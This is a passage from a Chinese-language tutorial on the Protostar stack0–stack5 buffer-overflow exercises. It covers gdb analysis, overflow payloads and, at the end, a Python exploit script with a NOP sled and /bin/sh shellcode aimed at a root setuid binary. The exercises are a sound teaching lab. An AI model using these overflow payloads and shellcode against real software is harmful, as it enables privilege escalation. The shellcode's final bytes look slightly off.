现在我们马上就要执行gets函数了，输入n执行gets函数
```
n    //next
```
我们随意输入一些内容，按下回车键
![](https://img-blog.csdnimg.cn/a8fba895f4a44ae6b10454f56ba74896.png#id=nFuuF&originHeight=44&originWidth=392&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/423cd4dc329c4f9e8503e6c7b0c195e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=nRtfL&originHeight=478&originWidth=906&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，0x41是A的ascii码，我们距离0x0000000还有一段距离
```
x/wx $esp+0x5c            //查看esp地址+0x5c偏移地址的内容
```
![](https://img-blog.csdnimg.cn/4c9fec6769df4db999251a394af61ee3.png#id=YgAs1&originHeight=53&originWidth=396&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
算了一下，我们需要68个字符才能覆盖
输入q退出gdb
然后使用echo或者python对程序进行输入
```
echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' | /opt/protostar/bin/stack0
```
```
python -c 'print "A"*(4+16*3+14)' | /opt/protostar/bin/stack0
```
![](https://img-blog.csdnimg.cn/71be3bb21b714ee586dfee3430e4c3b0.png#id=HFT1f&originHeight=100&originWidth=912&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
可以看到，我们已经成功打印出了正确的字符
#### 方式二：更改eip寄存器的值
寄存器的功能是存储二进制代码，不同的寄存器有不同的作用，这里，我们要认识一个很重要的寄存器，他叫做EIP，在64位程序里叫做RIP，他是程序的指针，指针就是寻找地址的，指到什么地址，就会运行该地址的参数，控制了这个指针，就能控制整个程序的运行
重新打开程序，由于我们可以控制eip寄存器，随便在哪下一个断点都行，我这里在程序头下一个断点
```
 b *main
```
运行程序到断点处
```
r
```
查看所有寄存器的值
```
info registers
```
![](https://img-blog.csdnimg.cn/c49fb9f3e03e4aff92fb88eec953e19e.png#id=tbtoM&originHeight=527&originWidth=887&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我打的断点地址为0x80483fd而eip寄存器的值也是0x80483fd
查看程序汇编代码
![](https://img-blog.csdnimg.cn/22cc9c8be6994097b4b654a57a276117.png#id=nwLFe&originHeight=458&originWidth=842&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
如果我们输入的值和程序设置的值不一样，就会跳转到0x8048427这个位置，然后输出try again，也就是破解失败，所以我们将eip寄存器的值修改成0x8048419，下一个地址调用了put函数，输出的是you have changed the 'modified' variable也就是破解成功了
现在我们修改eip寄存器的值
```
set $eip=0x8048419
```
修改后再次查看所有寄存器里的值，可以看到，现在eip指向了我们指定的地址
![](https://img-blog.csdnimg.cn/89a24c46dfb84224bd2db0ff9eb4dc1a.png#id=BplsQ&originHeight=392&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
n //执行下一个地址
```
![](https://img-blog.csdnimg.cn/7c819193fef64c5abffb0e9b0eefa3e3.png#id=jRtYF&originHeight=433&originWidth=755&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
破解成功
#### 方式三：修改eax寄存器的值
![](https://img-blog.csdnimg.cn/5bf16ca371cc41b2af38c2080d99939c.png#id=l62dh&originHeight=421&originWidth=666&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
最直接的方法是改变对比的值，使eax寄存器的值为不等于0，因为程序源代码逻辑为不等于0后才会输出正确的提示字符you have changed the 'modified' variable
![](https://img-blog.csdnimg.cn/c1c65aba37cb49238c1d9e268b3c9250.png#id=V9HPt&originHeight=560&originWidth=1046&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在对比的地方下一个断点
```
b *0x08048415
```
运行程序
```
r
```
查看所有寄存器里的值
![](https://img-blog.csdnimg.cn/e43aa17f55bd4e6294b311b1259586eb.png#id=Pf5zH&originHeight=552&originWidth=972&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
修改eax寄存器里的值
```
set $eax = 1
```
![](https://img-blog.csdnimg.cn/0f7ef1106dc547d7b069ca807a90cae8.png#id=vEwjZ&originHeight=384&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后继续运行程序
![](https://img-blog.csdnimg.cn/73d3a8f5e39a46c68b763c0b7f324cb1.png#id=br1Kk&originHeight=497&originWidth=705&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
破解成功
## 栈上变量覆盖以及通过环境变量造成栈溢出
### 什么是寄存器
寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限
计算机寄存器是位于CPU内部的一组用于存储和处理数据的高速存储器。用于存放指令、数据和运算结果
常见的寄存器名称以及作用：
```
累加器寄存器（Accumulator Register，EAX）：用于存储操作数和运算结果，在算术和逻辑操作中经常使用。

基址指针寄存器（Base Pointer Register，EBP）：用于指向堆栈帧的基地址，通常用于函数调用和局部变量访问。

堆栈指针寄存器（Stack Pointer Register，ESP）：指向当前活动堆栈的栈顶地址，在函数调用和参数传递中经常使用。

数据寄存器（Data Register，EDX、ECX、EBX）：用于存储数据，在算术和逻辑操作中经常使用。

指令指针寄存器（Instruction Pointer Register，EIP）：存储当前要执行的指令的内存地址，用于指示下一条要执行的指令。
```
### 程序静态分析
```
https://exploit.education/protostar/stack-one/
```
![](https://img-blog.csdnimg.cn/e12da44545f04f9592c72c0cd3c68a59.png#id=EvRi4&originHeight=1304&originWidth=2265&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
### 源代码分析
首先程序定义了两个函数变量
```
volatile int modified;
char buffer[64];
```
整数型变量 modified 和字符型变量buffer，其中字符型变量buffer的字符存储最大为64个字节
然后程序检测了我们输入的参数
```
if(argc == 1) {
    errx(1, "please specify an argument\n");
}
```
如果我们只运行程序，不输入参数就会输出please specify an argument并结束程序
之后程序定义了一个变量和进行了一个字符串复制操作
```
modified = 0;
strcpy(buffer, argv[1]);
```
modified变量为0，然后将我们输入的参数复制到buffer变量里
然后程序做了一个简单的if判断
```
if(modified == 0x61626364) {
    printf("you have correctly got the variable to the right value\n");
} else {
    printf("Try again, you got 0x%08x\n", modified);
```
如果modified变量等于0x61626364就输出you have correctly got the variable to the right value，代表着我们破解成功
0x61626364是十六进制，转换字符串是大写的ABCD
![](https://img-blog.csdnimg.cn/2bb294a5705141d2998d39bfa6d4803e.png#id=uG06s&originHeight=180&originWidth=377&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
也就是说，我们使modified变量变成ABCD就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值
### 汇编分析
使用gdb打开程序，输入指令查看汇编代码
```
set disassembly-flavor intel
disassemble main
```
![](https://img-blog.csdnimg.cn/b637b91d9d24463cbeebef8bfae230bc.png#id=rzceh&originHeight=712&originWidth=895&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
```
程序最关键的地方在这里
```
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
```

它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令
### 程序动态分析
我们先在程序执行对比指令的地址下一个断点
```
b *0x080484ab
```
然后设置一下自动运行我们设置的命令
```
define hook-stop
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
```
![](https://img-blog.csdnimg.cn/1933a14d251f465da752b5a1ce944078.png#id=jRBNP&originHeight=221&originWidth=643&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后执行程序，并指定参数
```
r AAAAAAAA
```
![](https://img-blog.csdnimg.cn/dc619392b05c47c885d2dfe85b6c2516.png#id=ciFNi&originHeight=760&originWidth=1136&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
程序执行到我们设置的断点处自动执行了我们上面设置的命令，在这里可以看到我们输入的8个大写A在栈中的位置，并且eax寄存器里的值为0
之前说过，程序将esp+0x5c地址处的值移动到了eax寄存器里，然后执行对比指令
![](https://img-blog.csdnimg.cn/288594083b24402086aae9b1cd4f4a6f.png#id=QjcTM&originHeight=56&originWidth=601&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
我们查看esp+0x5c地址存放的值
```
x/wx $esp+0x5c
```
![](https://img-blog.csdnimg.cn/753f28c1e04a4ec4bda6dfbee7c8f459.png#id=CUkHI&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12
![](https://img-blog.csdnimg.cn/5374480b972f42d69e2eecc3b24165e1.png#id=L7KnM&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量
![](https://img-blog.csdnimg.cn/42a79d7a2fc1402396c17ae1bb40319e.png#id=RpAqo&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在这里还有一个知识点是在x86架构里，读取是由低到高的，要使modified变量变成0x61626364，不能直接输入abcd，而是dcba
```
 python -c "print('A'*(4*16)+'dcba')"
```
![](https://img-blog.csdnimg.cn/c4ec90f08305424295ea6e9673aba6ef.png#id=EMcwG&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
成功破解了程序
### 程序静态分析

```
https://exploit.education/protostar/stack-two/
```

![](https://img-blog.csdnimg.cn/82848c1230be447ca4620158c6c6b3e5.png#id=cMTtH&originHeight=1341&originWidth=1973&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
程序源代码：
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的GREENIE变量内容
### 什么是环境变量？
任何计算机编程语言的两个基本组成部分，变量和常量。就像数学方程式中的自变量一样。变量和常量都代表唯一的内存位置，其中包含程序在其计算中使用的数据。两者的区别在于，变量在执行过程中可能会发生变化，而常量不能重新赋值
这里只举几个常见的环境变量
#### $PATH
包含了一些目录列表，作用是终端会在这些目录中搜索要执行的程序
查看$PATH环境变量
```
echo $PATH
```
![](https://img-blog.csdnimg.cn/2dbe298e262444b0ab238c6b645259d6.png#id=jHp4z&originHeight=177&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
假如我要执行whoami程序，那么终端会在这个环境变量里搜索名为whoami程序
搜索的目录如下
```
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/usr/local/games
/usr/games
```
![](https://img-blog.csdnimg.cn/37b867aaa8ed48f593bebc35ec89229b.png#id=KYgF9&originHeight=262&originWidth=585&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
而whoami程序在/usr/bin目录下，终端会执行这个目录下的whoami程序
![](https://img-blog.csdnimg.cn/0abd0a154bc94c8b8ce588a9ab70195a.png#id=DdTSZ&originHeight=81&originWidth=261&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
而windows的PATH环境变量在这可以看到
![](https://img-blog.csdnimg.cn/c6cb510cb52241e8b3a8881fdfca5b5e.png#id=saQ5y&originHeight=666&originWidth=936&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/fed50f07a53341d6bfd0687cd81e3d19.png#id=OIvq5&originHeight=752&originWidth=1252&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
#### $HOME
包含了当前用户的主目录
```
echo $HOME
```
![](https://img-blog.csdnimg.cn/0d5844b513da4a0d893278415a02c29c.png#id=tynGV&originHeight=81&originWidth=255&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
#### $PWD
包含了当前用户目前所在的目录位置
![](https://img-blog.csdnimg.cn/fdb7ecf67bcf49b993596d9be27c84c2.png#id=pXocG&originHeight=76&originWidth=260&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
关于环境变量的更多信息：
```
https://en.wikipedia.org/wiki/Environment_variable
```
### 破解程序
回到正题
```
variable = getenv("GREENIE");
strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
```
首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量
```
export GREENIE=$(python -c "print 'A'*(4*16)+'\x0a\x0d\x0a\x0d'"); ./stack2
```
直接运行就能成功破解了
![](https://img-blog.csdnimg.cn/ae4c4a865c98439392e54e8f1e36e75d.png#id=wGHdU&originHeight=107&originWidth=1006&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 溢出控制程序指针
### 程序静态分析
```
https://exploit.education/protostar/stack-three/
```
![](https://img-blog.csdnimg.cn/9ab01fb6b054470897ae6e646723a632.png#id=MA1gv&originHeight=1379&originWidth=2470&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
### 源代码分析
这个程序首先定义了一个win函数
```
void win()
{
  printf("code flow successfully changed\n");
}
```
调用这个win函数会输出code flow successfully changed，表示我们成功破解了程序
然后在mian函数内定义了一个指针变量fp和字符型变量buffer，buffer存储的字符大小为64位
```
volatile int (*fp)();
char buffer[64];
```
### 什么是指针？
在C语言中，指针是一种特殊的变量类型，它存储了一个内存地址。这个内存地址可以是其他变量或数据结构在内存中的位置
指针提供了直接访问和操作内存中数据的能力。通过指针，我们可以间接地访问、修改和传递数据，从而不需要直接对变量本身进行操作
```
fp = 0;
```
将fp的值设为0表示一个无效的指针，即它不指向任何有效的内存地址。这样做可以用来初始化指针变量，或者将指针重置为空指针

之后程序会使用gets函数接收用户的输入，并将接受到的字符串存储在buffer变量里，gets函数是一个危险的函数，他会造成缓冲区溢出，具体的解释可以看我的第一篇文章
程序接受输入后会进行一个if判断
```
gets(buffer);

if(fp) {
    printf("calling function pointer, jumping to 0x%08x\n", fp);
    fp();
}
```
if(fp)检查fp是否指向了某个有效的函数。如果fp不为空（即非零），则输出calling function pointer, jumping to 0x%08x，然后执行函数指针 fp 所指向的函数
也就是说，我们需要溢出覆盖fp设置的值，将fp原本的值改为win函数的地址，之后进入if判断后，会执行win函数
### 汇编分析
使用gdb打开程序，输入指令查看汇编代码
```
set disassembly-flavor intel
disassemble main
```
![](https://img-blog.csdnimg.cn/a70bd0dd02634bf7b84b79e021893122.png#id=LOUgZ&originHeight=786&originWidth=1038&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
程序最关键的地方是这两行
![](https://img-blog.csdnimg.cn/5a67ecbcffa842c1a2af2c8389514a23.png#id=uNA21&originHeight=530&originWidth=745&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
```
它将esp+0x5c地址的值转移到了eax寄存器里，然后调用call指令执行eax寄存器里的值
也就是说，我们只要将esp+0x5c地址的内容覆盖成win函数的地址，就能成功破解程序
### 程序动态分析
我们在0x08048471地址处下一个断点
```
b *0x08048471
```
然后设置一下自动运行的命令
```
define hook-stop
info registers   //显示寄存器里的地址
x/24wx $esp      //显示esp寄存器里的内容
x/2i $eip        //显示eip寄存器里的内容
end              //结束
```
![](https://img-blog.csdnimg.cn/03d6964e3ef74a61af0e7db0ee455f9f.png#id=VkXIj&originHeight=215&originWidth=714&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序，由于if判断，fp的值不能为零才能进入if判断，但是程序设置的fp的值为0，我们先输入一长串的垃圾字符，覆盖原来的值
![](https://img-blog.csdnimg.cn/3c879d390dc8483a86e233883bd09bff.png#id=rsXnu&originHeight=769&originWidth=1196&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
查看esp+0x5c地址处的值
```
x/wx $esp+0x5c
```
![](https://img-blog.csdnimg.cn/cbfb1bfc94da4cc5b26e7ad3a6918533.png#id=QPKeZ&originHeight=760&originWidth=1031&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
fp函数指针的值就在图中圈出来的地方，根据计算，我们需要64个字符+win函数地址才能控制fp函数指针
这时候我们可以用objdump工具来查看win函数地址
```
objdump -x stack3 | grep win
```
![](https://img-blog.csdnimg.cn/c5c5d7961f444f9984e59b713e4b9809.png#id=ork9w&originHeight=53&originWidth=725&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
或者直接使用gdb直接查看win函数就能知道地址
```
disassemble win
```
![](https://img-blog.csdnimg.cn/1be35a8680c640608037303ca50d5bed.png#id=YdJbO&originHeight=546&originWidth=946&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
两个方法都能用
知道了win函数地址后，直接运行以下命令就能破解程序
```
64个垃圾字符+win函数地址
python -c "print('A'*(4*16)+'\x24\x84\x04\x08')" | ./stack3
```
![](https://img-blog.csdnimg.cn/7112b39119de4369b0dcc53fd42e5e3f.png#id=JOnU2&originHeight=134&originWidth=1044&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

## 覆盖ret指令
### 程序静态分析
```
https://exploit.education/protostar/stack-four/
```
![](https://img-blog.csdnimg.cn/b3451f0f07d94150a358ea9d4e258192.png#id=KR9gL&originHeight=1229&originWidth=1925&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
这个程序很简单，就不多做介绍了，和上一个一模一样，只不过将设置的fp函数指针去掉了，我们需要自己控制程序指针进行跳转到win函数地址
直接进行程序动态分析
### 程序动态分析
使用gdb打开程序，输入指令查看汇编代码
```
set disassembly-flavor intel
disassemble main
```
![](https://img-blog.csdnimg.cn/6603edf8f151431a95aaad3856e1b9d0.png#id=UI4XU&originHeight=278&originWidth=751&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
代码很少，我们要做的只有一件事，控制ret指令的返回地址，让程序跳转到win函数地址执行参数
### leave和ret指令
在汇编语言中，ret指令用于从子程序返回到调用它的主程序。当执行到ret指令时，程序会跳转到主代码的地址，继续执行主程序的代码

在汇编语言中，leave指令用于清空栈，它会清除我们这次运行程序时获取的用户输入之类的，还原之前的状态
我们在leave指令的地址下一个断点
```
b *0x0804841d
```
运行程序，然后随便输入一些字符，然后查看栈里的内容，记录下来，之后会用到
![](https://img-blog.csdnimg.cn/82bfce200f744bf38b7fd2e0e53bd3ed.png#id=fA14x&originHeight=695&originWidth=918&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
然后输入n执行下一个指令，让ret指令执行，输入info registers查看寄存器的值
![](https://img-blog.csdnimg.cn/df91929baf4442fbb64c93c7e3c2d287.png#id=NNGWC&originHeight=468&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
当前eip寄存器的值为0xb7eadc76，也就是说，执行了rat指令后，程序回到了0xb7eadc76继续执行之后的命令
但是返回的地址也是在栈中的
![](https://img-blog.csdnimg.cn/b61a24b8fa5043688e52565c80a0cc75.png#id=IIXfI&originHeight=686&originWidth=976&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
根据计算，我们需要输入76个字符+win函数地址才能覆盖原来ret返回的地址，让程序跳转到win函数地址处执行
```
python -c "print('A'*76+'\xf4\x83\x04\x08')" | ./stack4
```
![](https://img-blog.csdnimg.cn/a720b73325e543778112f38a29c6b44b.png#id=a1dpa&originHeight=101&originWidth=950&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
## 在栈中写入shellcode并执行
### 程序静态分析
```
https://exploit.education/protostar/stack-five/
```
![](https://img-blog.csdnimg.cn/a12fefeb4e594ebf8f1a87cccd6ebe0e.png#id=ZhSwN&originHeight=810&originWidth=1623&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
这个程序很简单，只有两行，作用只是接受我们的输入
### setuid
什么是setuid？
```
setuid代表设置用户身份，并且setuid设置调用进程的有效用户ID，用户运行程序的uid与调用进程的真实uid不匹配
```
这么说起来有点绕，我们来举一个例子
```
一个要以root权限运行的程序，但我们想让普通用户也能运行它，但又要防止该程序被攻击者利用，这里就需要用的setuid了
```
演示
我们用user用户运行一个vim
然后新开一个窗口查看后台进程
```
ps -aux
```
![](https://img-blog.csdnimg.cn/bbc3e82f1a2948209a4a1d37cdbc6ae5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=NQ2J2&originHeight=975&originWidth=1790&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这里可以看到，我们的vim正在以user的权限运行中，然后我们去执行一下靶机上的setuid文件看看
![](https://img-blog.csdnimg.cn/30c53f076fde40398592a2264a8f5a9f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=XUczA&originHeight=970&originWidth=1762&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
这里可以看到，我们虽然是user用户，但执行文件后，文件正以root权限运行
我们查看文件的权限
![](https://img-blog.csdnimg.cn/0f59f934076248e79dbcde8ff371e9e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQmExX01hMA==,size_20,color_FFFFFF,t_70,g_se,x_16#id=dnAlP&originHeight=472&originWidth=824&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
r代表读，w代表写，x代表执行，那s是什么呢
```
s替换了以x的可执行文件，这被称为setuid位，根据刚刚的操作，应该知道了s是做什么的
```
当这个位被user权限的用户执行时，linux实际上是以文件的创造者的权限运行的，在这种情况下，它是以root权限运行的
我们的目标就是，破解这些文件然后拿到root权限
### 什么是栈？
可以把栈想象成一个堆积的书本，你可以把新的书本放在最顶部，也可以取出最顶部的书本。

当程序执行时，它会使用栈来跟踪函数调用和变量的值。每次你调用一个函数，计算机会在栈上创建一个新的“帧”（就像书本一样），用来存储这个函数的局部变量和执行时的一些信息。当函数执行完毕时，这个帧会被从栈上移除，就像取出一本书本一样。

栈通常是“后进先出”的，这意味着最后放入栈的数据会最先被取出。这是因为栈的操作是非常快速和高效的，所以它经常用于管理函数调用和跟踪程序执行流程
### 为什么要覆盖ret返回地址
覆盖 ret 返回地址是一种计算机攻击技巧，攻击者利用它来改变程序执行的路径。这个过程有点像将一个路标或导航指令替换成你自己的指令，以便程序执行到你想要的地方。

想象一下，你在开车时遇到一个交叉路口，路标告诉你向左拐才能到达目的地。但是，攻击者可能会悄悄地改变路标，让你误以为需要向右拐。当你按照这个伪装的路标行驶时，你最终会到达攻击者想要的地方，而不是你本来的目的地。

在计算机中，程序执行的路径通常是通过返回地址控制的，这个返回地址告诉计算机在函数执行完毕后应该继续执行哪里的代码。攻击者可以通过修改这个返回地址，迫使程序跳转到他们指定的地方，通常是一段恶意代码，而不是正常的程序代码
### 获取ret返回地址
使用gdb打开程序，在执行leave指令的地方下一个断点
![](https://img-blog.csdnimg.cn/11d479c6260b4a3c89383958be65d347.png#id=HihHK&originHeight=299&originWidth=594&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
运行程序，随便输入一些字符，然后查看栈状态
```
x/100wx $esp
```
![](https://img-blog.csdnimg.cn/29dd75c07bfa4fbfba42dc8324af1723.png#id=ILchb&originHeight=585&originWidth=750&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
另外开一个远程连接界面，使用gdb打开程序，在执行ret指令的地方下一个断点
![](https://img-blog.csdnimg.cn/8c83a2f252544df5a83a0ecb0af90474.png#id=UNVvO&originHeight=1013&originWidth=1716&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
在第二个终端界面运行程序，随便输入一些字符，然后执行ret指令，查看程序跳转的地址
![](https://img-blog.csdnimg.cn/dce35252894c457dafe7ebdecccadb9c.png#id=kIdRS&originHeight=488&originWidth=642&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
![](https://img-blog.csdnimg.cn/0c491badbec348458a38504a3dfcd960.png#id=jr5kc&originHeight=496&originWidth=1403&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
根据计算，我们需要80个字符就能完全覆盖ret的返回地址，然后再将我们的shellcode放到控制数据的堆栈里
![](https://img-blog.csdnimg.cn/e543522938ef4064998c87871b494942.png#id=xnarN&originHeight=301&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
### nop指令
NOP指令是一种特殊的机器指令，它在计算机中执行时不做任何操作。简单来说，NOP指令是一种“空操作”，它不改变计算机的状态、不影响寄存器的值，也不执行任何计算或跳转

为了防止我们shellcode收到干扰，我们在shellcode代码前添加一些nop指令即可
### 脚本编写
```
import struct

padding = "A" * 76
eip = struct.pack("I",0xbffff7c0)
nopnop = "\x90"*64
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x88"

print padding+eip+nopnop+payload
```
首先设置一个76位的垃圾字符，然后利用struct模块的pack功能，作用是将一个无符号整数（I 表示无符号整数）转换为二进制数据，跳转到控制数据的栈里，最后写入nop指令和shellcode代码，shellcode代码可以在这个网站里找到
```
http://shell-storm.org/shellcode/files/shellcode-811.html
```
